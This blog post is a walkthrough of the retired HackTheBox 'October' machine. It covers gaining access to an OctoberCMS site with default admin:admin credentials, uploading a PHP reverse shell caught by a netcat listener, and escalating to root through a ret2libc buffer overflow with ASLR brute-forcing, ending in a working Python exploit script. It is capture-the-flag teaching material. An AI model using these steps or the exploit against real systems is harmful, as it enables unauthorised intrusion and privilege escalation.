---
layout: post
title:  "HackTheBox - October"
date:   2017-07-25 19:00:00 +0100
categories: [hackthebox]
description: Solutions for HackTheBox October
image:
  feature: october.jpg
  credit:
  creditlink:
---
**Edit**: A few months on and i have found my understanding and explanation of some of the concepts here lacking to say the least.  As a result, I have decided to improve the explanations offered here.

This writeup details attacking the machine October (10.10.10.16) on [HackTheBox](www.hackthebox.eu).

Since this machine is now retired, it no longer gives points.

First things first, we attack the device using an nmap scan.

In this post I've just scanned all ports but I've found a much more efficient way to do it is to scan the host with a faster scan, just to get a view of the ports and then use the 'all-scripts' option on those resulting ports.  This may be how it operates under the hood but I found the following to be the most efficient combination.

```bash
nmap -p- -T4 [host]
nmap -p [ports] -A [host]
```

The '-A' flag just tells it to run all scripts.

{%highlight bash%}
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 79:b1:35:b6:d1:25:12:a3:0c:b5:2e:36:9c:33:26:28 (DSA)
|   2048 16:08:68:51:d1:7b:07:5a:34:66:0d:4c:d0:25:56:f5 (RSA)
|_  256 e3:97:a7:92:23:72:bf:1d:09:88:85:b6:6c:17:4e:85 (ECDSA)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-methods: 
|_  Potentially risky methods: PUT PATCH DELETE
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: October CMS - Vanilla
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.1 (91%), Linux 3.16 (91%), Linux 3.16 - 3.19 (91%), Linux 3.18 (91%), Linux 3.2 - 4.4 (91%), Linux 4.2 (91%), Linux 4.4 (91%), Linux 3.11 (90%), Linux 3.12 (90%), Linux 3.13 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   79.38 ms  10.10.12.1
2   119.08 ms 10.10.10.16
 
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.45 seconds
{%endhighlight%}

From this result we see that only two ports are open, with nothing but an HTTP Server and a SSH port open.  First things first, lets just visit the website and see if there's anything interesting there.  So we direct our web-browser to the IP.

![MyOhMy](/assets/images/October/1.png)

This looks interesting.  Seems like a default install of OctoberCMS, lets see if there are any exploits out there in the wild.  Exploit-DB or running the internal searchsploit command is best for doing something like this.

The first one I came across was [this](https://www.exploit-db.com/exploits/41936/), which contains a whole host of vulnerabilities.  The first details getting an executable onto the system so we now know how to get shell access at least, but we need account credentials.

So after a bit more searching on the internet for default directories (this is just achieved by searching for things like 'octobercms admin panel') we find the admin login at [http://10.10.10.16/backend/cms](http://10.10.10.16/backend/cms).  Sometimes default credentials work and [lo and behold](https://octobercms.com/forum/post/is-there-a-default-admin-user-password-and-name), admin:admin works.

Following the exploit for shell upload we saw earlier, we navigate to the media page and upload a [reverse shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) containing our details.  It even gives you a handy link to you shell.  So now we have executable code residing on the remote server

![MyOhMy](/assets/images/October/2.png)

So we open a netcat listener on our chosen port which will listen for the connection from the remote server when we execute the php script.
```bash
root@kali:~/Desktop# nc -lvp 1234
listening on [any] 1234 ...
10.10.10.16: inverse host lookup failed: Unknown host
connect to [10.10.13.134] from (UNKNOWN) [10.10.10.16] 37610
Linux october 4.4.0-78-generic #99~14.04.2-Ubuntu SMP Thu Apr 27 18:51:25 UTC 2017 i686 i686 i686 GNU/Linux
18:33:19 up  7:16,  0 users,  load average: 6.84, 5.87, 5.76
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ find -perm 4000 2>/dev/null
$ find -perm -4000 2>/dev/null
./bin/umount
./bin/ping
./bin/fusermount
---SNIP---
./usr/sbin/uuidd
./usr/local/bin/ovrflw
$ /usr/local/bin/ovrflw
Syntax: ./ovrflw <input string>
```
One of the first things I normally do is look for suid files which allow us to more easily escalate.  An SUID executable is a program that runs with the privileges of the file owner as opposed to the user running it.  In Linux there are three levels of permissions.  Owner, Group and Everyone.  Each file will have a user and group owner.  Both of these will have permissions relating to allowing them to read, write or execute that file as will everyone who is not these two.  These rules do not apply to the user root, who can do anything.  In effect, if you run an SUID file owned by root, no matter what user you are, you will run the program as root.

I won't go into great detail on this but it's absolutely worth a read up on as it's a fundamental part of a large number of exploits. 

After a very quick search, I've found what appears to be the way in.  It's handily named ovrflw, telling us we're probably going to have to use a buffer overflow. 

Smash The Stack
---------------
A buffer overflow works in the following manner.  While we're all familiar with the basics, it's always helpful to reiterate what's happening.  

Imagine a situation like this:
```c
char buf[5];
strcpy(buf, "123456");
```

We can see an issue almost immediately, in that we're copying a string of length 6 into a buffer of length 5.  The program won't start dying immediately, as the buffer will be stored on what's known as the stack.  The `char buf[5]` line merely reserves 5 bytes on the stack, so without any checks in place in our code, any operation to write beyond that will just write to areas of the stack used for something else.  

If we write far enough however, we'll end up overwriting EIP.  This is a register which holds the location of the next address to be executed.  If we can overwrite this, we can mark an instruction of our own to be executed.

Finding EIP Offset
------------------

The program reads in a string as an argument and then doesn't appear to do much with it.  Using /usr/share/metasploit-framework/tools/pattern_create.rb, we can create a string, pass it into the program, examine the registers and see at what value the eip register was overwritten with.

```bash
$ gdb -q ovrflw
Reading symbols from ovrflw...(no debugging symbols found)...done.
(gdb) break *main+48
Breakpoint 1 at 0x80484ad
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Starting program: /usr/local/bin/ovrflw Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag


Breakpoint 1, 0x080484ad in main ()
(gdb) i r
eax            0x2 2
ecx            0xd77d55b5 -679651915
edx            0xbfd293e4 -1076718620
ebx            0xb76ed000 -1217474560
esp            0xbfd29330 0xbfd29330
ebp            0xbfd293b8 0xbfd293b8
esi            0x0 0
edi            0x0 0
eip            0x80484ad 0x80484ad <main+48>
eflags         0x202 [ IF ]
cs             0x73 115
ss             0x7b 123
ds             0x7b 123
es             0x7b 123
fs             0x0 0
gs             0x33 51
(gdb) 


(gdb) c
Continuing.


Program received signal SIGSEGV, Segmentation fault.
0x64413764 in ?? ()
(gdb) i r
eax            0x0 0
ecx            0xbfd29ea0 -1076715872
edx            0xbfd2940a -1076718582
ebx            0xb76ed000 -1217474560
esp            0xbfd293c0 0xbfd293c0
ebp            0x41366441 0x41366441
esi            0x0 0
edi            0x0 0
eip            0x64413764 0x64413764
eflags         0x10202 [ IF RF ]
cs             0x73 115
ss             0x7b 123
ds             0x7b 123
es             0x7b 123
fs             0x0 0
gs             0x33 51
```
From this we see our eip register is overwritten with 0x64413764, so passing that into /usr/share/metasploit-framework/tools/pattern_offset.rb, we get an offset of 112.  So we need to write 112 characters and then write the address of the instructions we want to be executed.

DEP
---------------
At this point, a classic buffer overflow would have you return to the beginning of your buffer.  The assumption would be that you would write some shellcode that would give you a root shell in the buffer, add some NOP instructions to make your buffer 112 characters long, and then just add the address of the beginning of the buffer.  In effect you set the next executable byte to be the address of the start of your buffer.  We won't go into getting that information because we can't do that.

This executable has been compiled with what is known as data execution prevention.  In effect it marks areas of memory that cannot execute code, and one happens to be the stack.  This directly prevents us performing a classic buffer overflow as if we return into our buffer the code with throw an error.  Luckily, bypassing this is easy.

We just need to use a technique called ret2libc.  Instead of overwriting EIP with the address of our buffer, we'll just put the address of a function in the C library, such as system, which we'll use to call 'bin/sh' and give us a root shell.  This is much easier than it sounds, firstly we just need to find the offset of the system function in libc.

```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```

This will give us our offset.  Now we need to find the same offset for the exit function.  This isn't completely necessary but it means that once we exit the shell, it will exit cleanly rather than segfaulting.  We're giving something for the program to return to once our shell is done.  It's exactly the same process as above.

We also need to find the location of a /bin/sh string which we can do using:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```

And now we just get the memory location of our libc.so.6, so we can construct the full memory address of our functions.
```bash
ldd ovrflw | grep libc
```
If we wanted this to go off without a hitch, these would be constant, but give it a go and you'll see a different result each time.

ASLR
----
Address Space Layout Randomization just randomizes the starting addresses of the libraries being called by our program, specifically to defeat our last attack.  Luckily, this program is a 32 bit program.  

You might ask, why does that matter?  Well give it a go a few times and you'll see only one byte of information changes each time.  In effect there are only 256 possible starting memory locations, which we can trivially bruteforce.  To defeat this, we just enumerate as many times as possible until we pop a shell.  Not a very good defense mechanism...on 32 bit, this is not feasible on a 64 bit machine.

Below is the resulting exploit.

Code was adapted from [https://sploitfun.wordpress.com/2015/05/08/bypassing-aslr-part-ii/](https://sploitfun.wordpress.com/2015/05/08/bypassing-aslr-part-ii/)

```python
import struct
from subprocess import call
#We need to find the libc offset, but since it's going to be aslr'd
#we therefore have to get the base address of libc.so
#and then the offset of system and exit from libc start will remain constant

#Note this is for my local machine
#libc start address only varies by two bytes so 256 possible addresses
libcstart = 0xb75a2000 #Guess this and hope it hits it again ldd ovrflw | grep libc
libcsystem_off = 0x00040310
libcexit_off = 0x00033260
#readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system

system = libcstart + libcsystem_off
exit = libcstart + libcexit_off

sh_offset = 0x162bac #offsetof sh followed by null byte
sh = libcstart + sh_offset
#strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh

def conv(num):
        return struct.pack("<I", num)


buf = "A"*112 + conv(system) + conv(exit) + conv(sh)
i=0
while i < 256:
        print i
        i += 1

        ret = call(["/usr/local/bin/ovrflw", buf])
```



